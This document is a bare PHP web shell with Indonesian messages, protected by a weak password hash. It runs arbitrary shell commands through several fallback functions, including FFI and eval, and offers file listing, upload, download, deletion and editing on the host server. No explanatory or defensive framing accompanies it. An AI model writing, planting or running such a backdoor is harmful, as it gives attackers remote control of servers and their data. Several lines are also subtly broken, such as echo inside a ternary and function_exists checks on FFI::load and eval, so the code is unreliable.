
<?php
$pass = 'e10adc3949ba59abbe56e057f20f883e'; // MD5('123456')

function exec_cmd($c) {
    $o = '';
    $funcs = ['system','exec','shell_exec','passthru','popen','proc_open'];
    foreach ($funcs as $f) {
        if (function_exists($f)) {
            if ($f == 'popen') {
                $h = @popen($c . ' 2>&1', 'r');
                if ($h) { while (!feof($h)) $o .= fread($h, 4096); pclose($h); return $o; }
            } elseif ($f == 'proc_open') {
                $p = @proc_open($c, [1=>['pipe','w'],2=>['pipe','w']], $pp);
                if (is_resource($p)) {
                    $o = stream_get_contents($pp[1]) . stream_get_contents($pp[2]);
                    fclose($pp[1]); fclose($pp[2]); proc_close($p); return $o;
                }
            } else {
                ob_start(); @$f($c . ' 2>&1'); $o = ob_get_clean();
                if ($o !== '') return $o;
            }
        }
    }
    if (function_exists('FFI::load')) {
        try { $ffi = FFI::load('libc.so.6'); $fn = $ffi->system; return $fn($c); } catch (Throwable $e) {}
    }
    if (function_exists('eval')) {
        ob_start(); eval("system('".addslashes($c)." 2>&1');"); return ob_get_clean();
    }
    return 'Gagal menjalankan perintah.';
}

if (md5(@$_REQUEST['p']) !== $pass) die('Akses ditolak');

$cmd = @$_REQUEST['cmd'];
$act = @$_REQUEST['act'];
$dir = @$_REQUEST['dir'] ?? getcwd();
@chdir($dir);

if ($cmd !== '' && $cmd !== null) { echo exec_cmd($cmd); exit; }
if ($act === 'ls') { foreach (scandir(getcwd()) as $f) echo $f.(is_dir($f)?'/':'')."\n"; exit; }
if ($act === 'pwd') { echo getcwd(); exit; }
if ($act === 'cd' && isset($_REQUEST['dir'])) { @chdir($_REQUEST['dir']); echo getcwd(); exit; }
if ($act === 'upload' && isset($_FILES['file'])) {
    $target = getcwd() . '/' . basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $target) ? echo 'OK' : echo 'Gagal';
    exit;
}
if ($act === 'download' && isset($_REQUEST['file'])) {
    $f = $_REQUEST['file']; if (file_exists($f)) { header('Content-Disposition: attachment; filename="'.basename($f).'"'); readfile($f); }
    exit;
}
if ($act === 'delete' && isset($_REQUEST['file'])) { unlink($_REQUEST['file']) ? echo 'Dihapus' : echo 'Gagal'; exit; }
if ($act === 'edit' && isset($_REQUEST['file'])) {
    $f = $_REQUEST['file'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) { file_put_contents($f, $_POST['content']); echo 'Disimpan'; }
    elseif (file_exists($f)) echo file_get_contents($f);
    else echo 'File tidak ditemukan';
    exit;
}
?>
